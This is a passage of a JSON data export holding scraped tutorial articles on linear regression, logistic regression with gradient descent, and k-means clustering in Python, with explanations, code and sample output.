as:\u00a0So now, the linear model can be expressed in terms of matrices as:\u00a0where,\u00a0andNow, we determine an estimate of b, i.e. b\u2019 using the Least Squares method.As already explained, the Least Squares method tends to determine b\u2019 for which total residual error is minimized.We present the result directly here:\u00a0where \u2018 represents the transpose of the matrix while -1 represents the matrix inverse.Knowing the least square estimates, b\u2019, the multiple linear regression model can now be estimated as:where y\u2019 is the estimated response vector.Note: The complete derivation for obtaining least square estimates in multiple linear regression can be found here.Code: Python implementation of multiple linear regression techniques on the Boston house pricing dataset using Scikit-learn.\u00a0Pythonimport matplotlib.pyplot as pltimport numpy as npfrom sklearn import datasets, linear_model, metrics\u00a0# load the boston datasetboston = datasets.load_boston(return_X_y=False)\u00a0# defining feature matrix(X) and response vector(y)X = boston.datay = boston.target\u00a0# splitting X and y into training and testing setsfrom sklearn.model_selection import train_test_splitX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.4,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0random_state=1)\u00a0# create linear regression objectreg = linear_model.LinearRegression()\u00a0# train the model using the training setsreg.fit(X_train, y_train)\u00a0# regression coefficientsprint('Coefficients: ', reg.coef_)\u00a0# variance score: 1 means perfect predictionprint('Variance score: {}'.format(reg.score(X_test, y_test)))\u00a0# plot for residual error\u00a0## setting plot styleplt.style.use('fivethirtyeight')\u00a0## plotting residual errors in training dataplt.scatter(reg.predict(X_train), reg.predict(X_train) - y_train,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0color = \"green\", s = 10, label = 'Train data')\u00a0## plotting residual errors in test dataplt.scatter(reg.predict(X_test), reg.predict(X_test) - y_test,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0color = \"blue\", s = 10, label = 'Test data')\u00a0## plotting line for zero residual errorplt.hlines(y = 0, xmin = 0, xmax = 50, linewidth = 2)\u00a0## plotting legendplt.legend(loc = 'upper right')\u00a0## plot titleplt.title(\"Residual errors\")\u00a0## method call for showing the plotplt.show()Output:\u00a0Coefficients:\n[ -8.80740828e-02   6.72507352e-02   5.10280463e-02   2.18879172e+00\n-1.72283734e+01   3.62985243e+00   2.13933641e-03  -1.36531300e+00\n2.88788067e-01  -1.22618657e-02  -8.36014969e-01   9.53058061e-03\n-5.05036163e-01]\nVariance score: 0.720898784611and Residual Error plot looks like this:\u00a0\u00a0In the above example, we determine the accuracy score using Explained Variance Score.\u00a0We define:\u00a0explained_variance_score = 1 \u2013 Var{y \u2013 y\u2019}/Var{y}\u00a0where y\u2019 is the estimated target output, y the corresponding (correct) target output, and Var is Variance, the square of the standard deviation.\u00a0The best possible score is 1.0, lower values are worse.\u00a0\u00a0Assumptions:Given below are the basic assumptions that a linear regression model makes regarding a dataset on which it is applied:\u00a0\u00a0Linear relationship: Relationship between response and feature variables should be linear. The linearity assumption can be tested using scatter plots. As shown below, 1st figure represents linearly related variables whereas variables in the 2nd and 3rd figures are most likely non-linear. So, 1st figure will give better predictions using linear regression.\u00a0Little or no multi-collinearity: It is assumed that there is little or no multicollinearity in the data. Multicollinearity occurs when the features (or independent variables) are not independent of each other.Little or no auto-correlation: Another assumption is that there is little or no autocorrelation in the data. Autocorrelation occurs when the residual errors are not independent of each other. You can refer here for more insight into this topic.Homoscedasticity: Homoscedasticity describes a situation in which the error term (that is, the \u201cnoise\u201d or random disturbance in the relationship between the independent variables and the dependent variable) is the same across all values of the independent variables. As shown below, figure 1 has homoscedasticity while figure 2 has heteroscedasticity.\u00a0As we reach the end of this article, we discuss some applications of linear regression below.\u00a0Applications:Trend lines: A trend line represents the variation in quantitative data with the passage of time (like GDP, oil prices, etc.). These trends usually follow a linear relationship. Hence, linear regression can be applied to predict future values. However, this method suffers from a lack of scientific validity in cases where other potential changes can affect the data.Economics: Linear regression is the predominant empirical tool in economics. For example, it is used to predict consumer spending, fixed investment spending, inventory investment, purchases of a country\u2019s exports, spending on imports, the demand to hold liquid assets, labor demand, and labor supply.Finance: The capital price asset model uses linear regression to analyze and quantify the systematic risks of an investment.4. Biology: Linear regression is used to model causal relationships between parameters in biological systems.References:https://en.wikipedia.org/wiki/Linear_regressionhttps://en.wikipedia.org/wiki/Simple_linear_regressionhttp://scikit-learn.org/stable/auto_examples/linear_model/plot_ols.htmlhttp://www.statisticssolutions.com/assumptions-of-linear-regression/My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "5b69756d6eff4ecfe7df00f09134b88c",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Pre-requisite: Linear Regression\u00a0This article discusses the basics of Logistic Regression and its implementation in Python. Logistic regression is basically a supervised classification algorithm. In a classification problem, the target variable(or output), y, can take only discrete values for a given set of features(or inputs), X.Contrary to popular belief, logistic regression IS a regression model. The model builds a regression model to predict the probability that a given data entry belongs to the category numbered as \u201c1\u201d. Just like Linear regression assumes that the data follows a linear function, Logistic regression models the data using the sigmoid function.\u00a0Logistic regression becomes a classification technique only when a decision threshold is brought into the picture. The setting of the threshold value is a very important aspect of Logistic regression and is dependent on the classification problem itself.The decision for the value of the threshold value is majorly affected by the values of precision and recall. Ideally, we want both precision and recall to be 1, but this seldom is the case. In the case of a Precision-Recall tradeoff, we use the following arguments to decide upon the threshold:-1. Low Precision/High Recall: In applications where we want to reduce the number of false negatives without necessarily reducing the number of false positives, we choose a decision value that has a low value of Precision or a high value of Recall. For example, in a cancer diagnosis application, we do not want any affected patient to be classified as not affected without giving much heed to if the patient is being wrongfully diagnosed with cancer. This is because the absence of cancer can be detected by further medical diseases but the presence of the disease cannot be detected in an already rejected candidate.2. High Precision/Low Recall: In applications where we want to reduce the number of false positives without necessarily reducing the number of false negatives, we choose a decision value that has a high value of Precision or a low value of Recall. For example, if we are classifying customers whether they will react positively or negatively to a personalized advertisement, we want to be absolutely sure that the customer will react positively to the advertisement because otherwise, a negative reaction can cause a loss of potential sales from the customer.Based on the number of categories, Logistic regression can be classified as:\u00a0\u00a0binomial: target variable can have only 2 possible types: \u201c0\u201d or \u201c1\u201d which may represent \u201cwin\u201d vs \u201closs\u201d, \u201cpass\u201d vs \u201cfail\u201d, \u201cdead\u201d vs \u201calive\u201d, etc.multinomial: target variable can have 3 or more possible types which are not ordered(i.e. types have no quantitative significance) like \u201cdisease A\u201d vs \u201cdisease B\u201d vs \u201cdisease C\u201d.ordinal: it deals with target variables with ordered categories. For example, a test score can\u00a0be categorized as:\u201cvery poor\u201d, \u201cpoor\u201d, \u201cgood\u201d, \u201cvery good\u201d. Here, each category can be given a score like 0, 1, 2, 3.First of all, we explore the simplest form of Logistic Regression, i.e Binomial Logistic Regression.\u00a0\u00a0Binomial Logistic RegressionConsider an example dataset which maps the number of hours of study with the result of an exam. The result can take only two values, namely passed(1) or failed(0):Hours(x)\n0.50\n0.75\n1.00\n1.25\n1.50\n1.75\n2.00\n2.25\n2.50\n2.75\n3.00\n3.25\n3.50\n3.75\n4.00\n4.25\n4.50\n4.75\n5.00\n5.50\n\n\nPass(y)\n0\n0\n0\n0\n0\n0\n1\n0\n1\n0\n1\n0\n1\n0\n1\n1\n1\n1\n1\n1So, we have\u00a0\u00a0i.e. y is a categorical target variable that can take only two possible type: \u201c0\u201d or \u201c1\u201d.\u00a0In order to generalize our model, we assume that:\u00a0\u00a0The dataset has \u2018p\u2019 feature variables and \u2018n\u2019 observations.The feature matrix is represented as:\u00a0Here,\u00a0denotes the values of\u00a0feature for\u00a0observation.\u00a0Here, we are keeping the convention of letting\u00a0= 1. (Keep reading, you will understand the logic in a few moments).The\u00a0observation,\u00a0, can be represented as:\u00a0\u00a0represents the predicted response for\u00a0observation, i.e.\u00a0. The formula we use for calculating\u00a0is called hypothesis.If you have gone through Linear Regression, you should recall that in Linear Regression, the hypothesis we used for prediction was:\u00a0where,\u00a0are the regression coefficients.\u00a0Let regression coefficient matrix/vector,\u00a0be:\u00a0Then, in a more compact form,\u00a0\u00a0\u00a0The reason for taking\u00a0= 1 is pretty clear now.We needed to do a matrix product, but there was noactual\u00a0multiplied to\u00a0in original hypothesis formula. So, we defined\u00a0= 1.\u00a0\u00a0Now, if we try to apply Linear Regression to the above problem, we are likely to get continuous values using the hypothesis we discussed above. Also, it does not make sense for\u00a0to take values larger than 1 or smaller than 0.\u00a0So, some modifications are made to the hypothesis for classification:\u00a0\u00a0where,\u00a0is called logistic function or the sigmoid function.\u00a0Here is a plot showing g(z):\u00a0\u00a0We can infer from the above graph that:\u00a0\u00a0g(z) tends towards 1 as\u00a0g(z) tends towards 0 as\u00a0g(z) is always bounded between 0 and 1So, now, we can define conditional probabilities for 2 labels(0 and 1) for\u00a0observation as:\u00a0We can write it more compactly as:\u00a0Now, we define another term, likelihood of parameters as:\u00a0\u00a0Likelihood is nothing but the probability of data(training examples), given a model and specific parameter values(here,\u00a0). It measures the support provided by the data for each possible value of the\u00a0. We obtain it by multiplying all\u00a0for given\u00a0.\u00a0\u00a0And for easier calculations, we take log-likelihood:\u00a0The cost function for logistic regression is proportional to the inverse of the likelihood of parameters. Hence, we can obtain an expression for cost function, J using log-likelihood equation as:\u00a0and our aim is to estimate\u00a0so that cost function is minimized !!\u00a0Using Gradient descent algorithmFirstly, we take partial derivatives of\u00a0w.r.t each\u00a0to derive the stochastic gradient descent rule(we present only the final derived value here):\u00a0Here, y and h(x) represents the response vector and predicted response vector(respectively). Also,\u00a0is the vector representing the observation values for\u00a0feature.\u00a0Now, in order to get min\u00a0,\u00a0where\u00a0is called learning rate and needs to be set explicitly.\u00a0Let us see the python implementation of the above technique on a sample dataset (download it from here): 2.25\u00a02.50\u00a02.75\u00a03.00\u00a03.25\u00a03.50\u00a03.75\u00a04.00\u00a04.25\u00a04.50\u00a04.75\u00a05.00\u00a05.50\u00a0Pythonimport csvimport numpy as npimport matplotlib.pyplot as plt\u00a0\u00a0def loadCSV(filename):\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0function to load dataset\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0with open(filename,\"r\") as csvfile:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0lines = csv.reader(csvfile)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0dataset = list(lines)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for i in range(len(dataset)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0dataset[i] = [float(x) for x in dataset[i]]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return np.array(dataset)\u00a0\u00a0def normalize(X):\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0function to normalize feature matrix, X\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0mins = np.min(X, axis = 0)\u00a0\u00a0\u00a0\u00a0maxs = np.max(X, axis = 0)\u00a0\u00a0\u00a0\u00a0rng = maxs - mins\u00a0\u00a0\u00a0\u00a0norm_X = 1 - ((maxs - X)/rng)\u00a0\u00a0\u00a0\u00a0return norm_X\u00a0\u00a0def logistic_func(beta, X):\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0logistic(sigmoid) function\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0return 1.0/(1 + np.exp(-np.dot(X, beta.T)))\u00a0\u00a0def log_gradient(beta, X, y):\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0logistic gradient function\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0first_calc = logistic_func(beta, X) - y.reshape(X.shape[0], -1)\u00a0\u00a0\u00a0\u00a0final_calc = np.dot(first_calc.T, X)\u00a0\u00a0\u00a0\u00a0return final_calc\u00a0\u00a0def cost_func(beta, X, y):\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0cost function, J\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0log_func_v = logistic_func(beta, X)\u00a0\u00a0\u00a0\u00a0y = np.squeeze(y)\u00a0\u00a0\u00a0\u00a0step1 = y * np.log(log_func_v)\u00a0\u00a0\u00a0\u00a0step2 = (1 - y) * np.log(1 - log_func_v)\u00a0\u00a0\u00a0\u00a0final = -step1 - step2\u00a0\u00a0\u00a0\u00a0return np.mean(final)\u00a0\u00a0def grad_desc(X, y, beta, lr=.01, converge_change=.001):\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0gradient descent function\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0cost = cost_func(beta, X, y)\u00a0\u00a0\u00a0\u00a0change_cost = 1\u00a0\u00a0\u00a0\u00a0num_iter = 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0while(change_cost > converge_change):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0old_cost = cost\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0beta = beta - (lr * log_gradient(beta, X, y))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cost = cost_func(beta, X, y)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0change_cost = old_cost - cost\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0num_iter += 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return beta, num_iter\u00a0\u00a0def pred_values(beta, X):\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0function to predict labels\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0pred_prob = logistic_func(beta, X)\u00a0\u00a0\u00a0\u00a0pred_value = np.where(pred_prob >= .5, 1, 0)\u00a0\u00a0\u00a0\u00a0return np.squeeze(pred_value)\u00a0\u00a0def plot_reg(X, y, beta):\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0function to plot decision boundary\u00a0\u00a0\u00a0\u00a0'''\u00a0\u00a0\u00a0\u00a0# labelled observations\u00a0\u00a0\u00a0\u00a0x_0 = X[np.where(y == 0.0)]\u00a0\u00a0\u00a0\u00a0x_1 = X[np.where(y == 1.0)]\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# plotting points with diff color for diff label\u00a0\u00a0\u00a0\u00a0plt.scatter([x_0[:, 1]], [x_0[:, 2]], c='b', label='y = 0')\u00a0\u00a0\u00a0\u00a0plt.scatter([x_1[:, 1]], [x_1[:, 2]], c='r', label='y = 1')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# plotting decision boundary\u00a0\u00a0\u00a0\u00a0x1 = np.arange(0, 1, 0.1)\u00a0\u00a0\u00a0\u00a0x2 = -(beta[0,0] + beta[0,1]*x1)/beta[0,2]\u00a0\u00a0\u00a0\u00a0plt.plot(x1, x2, c='k', label='reg line')\u00a0\u00a0\u00a0\u00a0\u00a0plt.xlabel('x1')\u00a0\u00a0\u00a0\u00a0plt.ylabel('x2')\u00a0\u00a0\u00a0\u00a0plt.legend()\u00a0\u00a0\u00a0\u00a0plt.show()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if __name__ == \"__main__\":\u00a0\u00a0\u00a0\u00a0# load the dataset\u00a0\u00a0\u00a0\u00a0dataset = loadCSV('dataset1.csv')\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# normalizing feature matrix\u00a0\u00a0\u00a0\u00a0X = normalize(dataset[:, :-1])\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# stacking columns with all ones in feature matrix\u00a0\u00a0\u00a0\u00a0X = np.hstack((np.matrix(np.ones(X.shape[0])).T, X))\u00a0\u00a0\u00a0\u00a0\u00a0# response vector\u00a0\u00a0\u00a0\u00a0y = dataset[:, -1]\u00a0\u00a0\u00a0\u00a0\u00a0# initial beta values\u00a0\u00a0\u00a0\u00a0beta = np.matrix(np.zeros(X.shape[1]))\u00a0\u00a0\u00a0\u00a0\u00a0# beta values after running gradient descent\u00a0\u00a0\u00a0\u00a0beta, num_iter = grad_desc(X, y, beta)\u00a0\u00a0\u00a0\u00a0\u00a0# estimated beta values and number of iterations\u00a0\u00a0\u00a0\u00a0print(\"Estimated regression coefficients:\", beta)\u00a0\u00a0\u00a0\u00a0print(\"No. of iterations:\", num_iter)\u00a0\u00a0\u00a0\u00a0\u00a0# predicted labels\u00a0\u00a0\u00a0\u00a0y_pred = pred_values(beta, X)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# number of correctly predicted labels\u00a0\u00a0\u00a0\u00a0print(\"Correctly predicted labels:\", np.sum(y == y_pred))\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# plotting regression line\u00a0\u00a0\u00a0\u00a0plot_reg(X, y, beta)Estimated regression coefficients: [[  1.70474504  15.04062212 -20.47216021]]\nNo. of iterations: 2612\nCorrectly predicted labels: 100Note: Gradient descent is one of the many ways to estimate\u00a0.Basically, these are more advanced algorithms that can be easily run in Python once you have defined your cost function and your gradients. These algorithms are:\u00a0\u00a0BFGS(Broyden\u2013Fletcher\u2013Goldfarb\u2013Shanno algorithm)L-BFGS(Like BFGS but uses limited memory)Conjugate GradientAdvantages/disadvantages of using any one of these algorithms over Gradient descent:\u00a0\u00a0Advantages\u00a0Don\u2019t need to pick learning rateOften run faster (not always the case)Can numerically approximate gradient for you (doesn\u2019t always work out well)Disadvantages\u00a0More complexMore of a black box unless you learn the specifics\u00a0Multinomial Logistic RegressionIn Multinomial Logistic Regression, the output variable can have more than two possible discrete outputs. Consider the Digit Dataset. Here, the output variable is the digit value which can take values out of (0, 12, 3, 4, 5, 6, 7, 8, 9).\u00a0Given below is the implementation of Multinomial Logistic Regression using scikit-learn to make predictions on digit datasets.\u00a0Pythonfrom sklearn import datasets, linear_model, metrics\u00a0\u00a0# load the digit datasetdigits = datasets.load_digits()\u00a0\u00a0# defining feature matrix(X) and response vector(y)X = digits.datay = digits.target\u00a0# splitting X and y into training and testing setsfrom sklearn.model_selection import train_test_splitX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.4,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0random_state=1)\u00a0\u00a0# create logistic regression objectreg = linear_model.LogisticRegression()\u00a0\u00a0# train the model using the training setsreg.fit(X_train, y_train)\u00a0# making predictions on the testing sety_pred = reg.predict(X_test)\u00a0\u00a0# comparing actual response values (y_test) with predicted response values (y_pred)print(\"Logistic Regression model accuracy(in %):\",metrics.accuracy_score(y_test, y_pred)*100)\u00a0Logistic Regression model accuracy(in %): 95.6884561892At last, here are some points about Logistic regression to ponder upon:\u00a0\u00a0Does NOT assume a linear relationship between the dependent variable and the independent variables, but it does assume a linear relationship between the logit of the explanatory variables and the response.Independent variables can be even the power terms or some other nonlinear transformations of the original independent variables.The dependent variable does NOT need to be normally distributed, but it typically assumes a distribution from an exponential family (e.g. binomial, Poisson, multinomial, normal,\u2026); binary logistic regression assumes binomial distribution of the response.The homogeneity of variance does NOT need to be satisfied.Errors need to be independent but NOT normally distributed.It uses maximum likelihood estimation (MLE) rather than ordinary least squares (OLS) to estimate the parameters and thus relies on large-sample approximations.\u00a0\u00a0References:\u00a0http://cs229.stanford.edu/notes/cs229-notes1.pdfhttp://machinelearningmastery.com/logistic-regression-for-machine-learning/https://onlinecourses.science.psu.edu/stat504/node/164This article is contributed by Nikhil Kumar. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "c80055d850249abda90e55dbc4c2fcaa",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "We are given a data set of items, with certain features, and values for these features (like a vector). The\u00a0task is to categorize those items into groups. To achieve this, we will use the kMeans algorithm; an unsupervised learning algorithm.\u00a0\u00a0Overview(It will help if you think of items as points in an n-dimensional space). \u00a0The algorithm will categorize the items into k groups of similarity. To calculate that similarity, we will use the euclidean distance as measurement.The algorithm works as follows:\u00a0\u00a0First, we initialize k points, called means, randomly.We categorize each item to its closest mean and we update the mean\u2019s coordinates, which are the averages of the items categorized in that mean so far.We repeat the process for a given number of iterations and at the end, we have our clusters.The \u201cpoints\u201d mentioned above are called means because they hold the mean values of the items categorized in them. To initialize these means, we have a lot of options. An intuitive method is to initialize the means at random items in the data set. Another method is to initialize the means at random values between the boundaries of the data set (if for a feature x the items have values in [0,3], we will initialize the means with values for x at [0,3]).The above algorithm in pseudocode:\u00a0\u00a0Initialize k means with random values\n\nFor a given number of iterations:\n    Iterate through items:\n        Find the mean closest to the item\n        Assign item to mean\n        Update mean\u00a0Read DataWe receive input as a text file (\u2018data.txt\u2019). Each line represents an item, and it contains numerical values (one for each feature) split by commas. You can find a sample data set here.We will read the data from the file, saving it into a list. Each element of the list is another list containing the item values for the features. We do this with the following function:\u00a0Python3def ReadData(fileName):\u00a0\u00a0\u00a0\u00a0\u00a0# Read the file, splitting by lines\u00a0\u00a0\u00a0\u00a0f = open(fileName, 'r');\u00a0\u00a0\u00a0\u00a0lines = f.read().splitlines();\u00a0\u00a0\u00a0\u00a0f.close();\u00a0\u00a0\u00a0\u00a0\u00a0items = [];\u00a0\u00a0\u00a0\u00a0\u00a0for i in range(1, len(lines)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0line = lines[i].split(',');\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0itemFeatures = [];\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for j in range(len(line)-1):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Convert feature value to float\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0v = float(line[j]);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Add feature value to dict\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0itemFeatures.append(v);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0items.append(itemFeatures);\u00a0\u00a0\u00a0\u00a0\u00a0shuffle(items);\u00a0\u00a0\u00a0\u00a0\u00a0return items;Initialize MeansWe want to initialize each mean\u2019s values in the range of the feature values of the items. For that, we need to find the min and max for each feature. We accomplish that with the following function:\u00a0Pythondef FindColMinMax(items):\u00a0\u00a0\u00a0\u00a0n = len(items[0]);\u00a0\u00a0\u00a0\u00a0minima = [sys.maxint for i in range(n)];\u00a0\u00a0\u00a0\u00a0maxima = [-sys.maxint -1 for i in range(n)];\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for item in items:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for f in range(len(item)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (item[f] < minima[f]):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0minima[f] = item[f];\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (item[f] > maxima[f]):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0maxima[f] = item[f];\u00a0return minima,maxima;The variables minima, maxima are lists containing the min and max values of the items respectively. We initialize each mean\u2019s feature values randomly between the corresponding minimum and maximum in those above two lists:\u00a0Pythondef InitializeMeans(items, k, cMin, cMax):\u00a0\u00a0\u00a0\u00a0\u00a0# Initialize means to random numbers between\u00a0\u00a0\u00a0\u00a0# the min and max of each column/feature\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f = len(items[0]); # number of features\u00a0\u00a0\u00a0\u00a0means = [[0 for i in range(f)] for j in range(k)];\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for mean in means:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0for i in range(len(mean)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Set value to a random float\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# (adding +-1 to avoid a wide placement of a mean)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0mean[i] = uniform(cMin[i]+1, cMax[i]-1);\u00a0\u00a0\u00a0\u00a0\u00a0return means;Euclidean DistanceWe will be using the euclidean distance as a metric of similarity for our data set (note: depending on your items, you can use another similarity metric).\u00a0Python3def EuclideanDistance(x, y):\u00a0\u00a0\u00a0\u00a0S = 0; # The sum of the squared differences of the elements\u00a0\u00a0\u00a0\u00a0for i in range(len(x)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0S += math.pow(x[i]-y[i], 2)\u00a0\u00a0\u00a0\u00a0\u00a0#The square root of the sum\u00a0\u00a0\u00a0\u00a0return math.sqrt(S)Update MeansTo update a mean, we need to find the average value for its feature, for all the items in the mean/cluster. We can do this by adding all the values and then dividing by the number of items, or we can use a more elegant solution. We will calculate the new average without having to re-add all the values, by doing the following:\u00a0\u00a0m = (m*(n-1)+x)/nwhere m is the mean value for a feature, n is the number of items in the cluster, and x is the feature value for the added item. We do the above for each feature to get the new mean.\u00a0Pythondef UpdateMean(n,mean,item):\u00a0\u00a0\u00a0\u00a0for i in range(len(mean)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0m = mean[i];\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0m = (m*(n-1)+item[i])/float(n);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0mean[i] = round(m, 3);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return mean;Classify ItemsNow we need to write a function to classify an item into a group/cluster. For the given item, we will find its similarity to each mean, and we will classify the item to the closest one.\u00a0Pythondef Classify(means,item):\u00a0\u00a0\u00a0\u00a0\u00a0# Classify item to the mean with minimum distance\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0minimum = sys.maxint;\u00a0\u00a0\u00a0\u00a0index = -1;\u00a0\u00a0\u00a0\u00a0\u00a0for i in range(len(means)):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Find distance from item to mean\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0dis = EuclideanDistance(item, means[i]);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (dis < minimum):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0minimum = dis;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0index = i;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return index;Find MeansTo actually find the means, we will loop through all the items, classify them 